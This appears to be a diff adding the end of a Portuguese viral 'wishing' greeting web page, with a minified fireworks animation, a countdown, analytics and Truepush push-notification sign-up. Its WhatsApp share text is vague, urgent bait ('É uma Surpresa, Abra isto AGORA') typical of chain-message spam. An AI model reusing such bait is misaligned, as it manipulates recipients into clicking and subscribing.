+function write_fire(e){var t,n,r;stars[e+"r"]=createDiv("|",12);boddie.appendChild(stars[e+"r"]);for(t=bits*e;t<bits+bits*e;t++){stars[t]=createDiv("*",13);boddie.appendChild(stars[t])}}function createDiv(e,t){var n=document.createElement("div");n.style.font=t+"px monospace";n.style.position="absolute";n.style.backgroundColor="transparent";n.appendChild(document.createTextNode(e));return n}function launch(e){colour[e]=Math.floor(Math.random()*colours.length);Xpos[e+"r"]=swide*.5;Ypos[e+"r"]=shigh-5;bangheight[e]=Math.round((.5+Math.random())*shigh*.4);dX[e+"r"]=(Math.random()-.5)*swide/bangheight[e];if(dX[e+"r"]>1.25)stars[e+"r"].firstChild.nodeValue="/";else if(dX[e+"r"]<-1.25)stars[e+"r"].firstChild.nodeValue="\\";else stars[e+"r"].firstChild.nodeValue="|";stars[e+"r"].style.color=colours[colour[e]]}function bang(e){var t,n,r=0;for(t=bits*e;t<bits+bits*e;t++){n=stars[t].style;n.left=Xpos[t]+"px";n.top=Ypos[t]+"px";if(decay[t])decay[t]--;else r++;if(decay[t]==15)n.fontSize="7px";else if(decay[t]==7)n.fontSize="2px";else if(decay[t]==1)n.visibility="hidden";Xpos[t]+=dX[t];Ypos[t]+=dY[t]+=1.25/intensity[e]}if(r!=bits)setTimeout("bang("+e+")",speed)}function stepthrough(e){var t,n,r;var i=Xpos[e+"r"];var s=Ypos[e+"r"];Xpos[e+"r"]+=dX[e+"r"];Ypos[e+"r"]-=4;if(Ypos[e+"r"]<bangheight[e]){n=Math.floor(Math.random()*3*colours.length);intensity[e]=5+Math.random()*4;for(t=e*bits;t<bits+bits*e;t++){Xpos[t]=Xpos[e+"r"];Ypos[t]=Ypos[e+"r"];dY[t]=(Math.random()-.5)*intensity[e];dX[t]=(Math.random()-.5)*(intensity[e]-Math.abs(dY[t]))*1.25;decay[t]=16+Math.floor(Math.random()*16);r=stars[t];if(n<colours.length)r.style.color=colours[t%2?colour[e]:n];else if(n<2*colours.length)r.style.color=colours[colour[e]];else r.style.color=colours[t%colours.length];r.style.fontSize="13px";r.style.visibility="visible"}bang(e);launch(e)}stars[e+"r"].style.left=i+"px";stars[e+"r"].style.top=s+"px"}function set_width(){var e=999999;var t=999999;if(document.documentElement&&document.documentElement.clientWidth){if(document.documentElement.clientWidth>0)e=document.documentElement.clientWidth;if(document.documentElement.clientHeight>0)t=document.documentElement.clientHeight}if(typeof self.innerWidth!="undefined"&&self.innerWidth){if(self.innerWidth>0&&self.innerWidth<e)e=self.innerWidth;if(self.innerHeight>0&&self.innerHeight<t)t=self.innerHeight}if(document.body.clientWidth){if(document.body.clientWidth>0&&document.body.clientWidth<e)e=document.body.clientWidth;if(document.body.clientHeight>0&&document.body.clientHeight<t)t=document.body.clientHeight}if(e==999999||t==999999){e=800;t=600}swide=e;shigh=t}var bits=80;var speed=33;var bangs=5;var colours=new Array("#03f","#f03","#0e0","#93f","#0cf","#f93","#f0c");var bangheight=new Array;var intensity=new Array;var colour=new Array;var Xpos=new Array;var Ypos=new Array;var dX=new Array;var dY=new Array;var stars=new Array;var decay=new Array;var swide=800;var shigh=600;var boddie;window.onload=function(){if(document.getElementById){var e;boddie=document.createElement("div");boddie.style.position="fixed";boddie.style.top="0px";boddie.style.left="0px";boddie.style.overflow="visible";boddie.style.width="1px";boddie.style.height="1px";boddie.style.backgroundColor="transparent";document.body.appendChild(boddie);set_width();for(e=0;e<bangs;e++){write_fire(e);launch(e);setInterval("stepthrough("+e+")",speed)}}};window.onresize=set_width//]]></script>
+
+
+
+
+
+<footer>
+
+    
+
+        
+    <script>
+        var count_down_date = 'Jan 1, 2021';
+        var enter_name = 'Coloque Seu Nome';
+
+        var enter_wish = 'Digite seu nome na caixa abaixo, crie seu desejo e compartilhe com seus amigos e familiares 👇👇👇 ';
+        var whatsapp_msg = '&quot;\ud83c\udf81 *Ol\u00e1* \ud83c\udf81%0A\ud83c\udf81 *Ol\u00e1* \ud83c\udf81%0A\ud83c\udf81 *Ol\u00e1* \ud83c\udf81%0A\ud83d\udca3\ud83d\udc96 *\u00c9 uma Surpresa*  \ud83c\udf87\ud83e\udd17%0A*Abra isto AGORA* \ud83e\udd2b\ud83e\udd2d%0A\u203c\ufe0f\ud83d\udc47\ud83d\udc47\ud83d\udc47\u203c\ufe0f%0A&quot;'.replace(/(&quot\;)/g,"");
+
+        var time = {"days" : 'Dias', "hrs" : 'Hrs', "mins" : 'Min', "sec" : 'Seg'};
+    </script>
+    
+
+
+    <script>
+        var analytics = '182613761';
+        var locale = 'pt';
+    </script>
+    <script src="./f-n2_files/js/gaevent.js"></script>
+
+    <script src="./f-n2_files/js/festival.js"></script>
+        <script src="./f-n2_files/js/app.js"></script>
+    <script>
+    if (getCookie('visited') != '' && getCookie('visited') > 4) {
+        var truepush = window.truepush || [];
+        truepush.push(function(){
+            truepush.Init({
+                id: "5ec8fb865558cfe7cca43484"
+                }, function(error){
+                  // if(error) console.error(error);
+            });
+        });
+        truepush.push({
+            operation: "add-tags",
+            data: [{ tagName: "locale", tagType: "string", tagValue: "pt"}, { tagName: "domain", tagType: "string", tagValue: "https://vejo.site"}],
+            callback: function(error,response){
+                // console.log(error,response);
+            }
+        });
+    }
+    </script>
+</footer>
+
+
+</html>
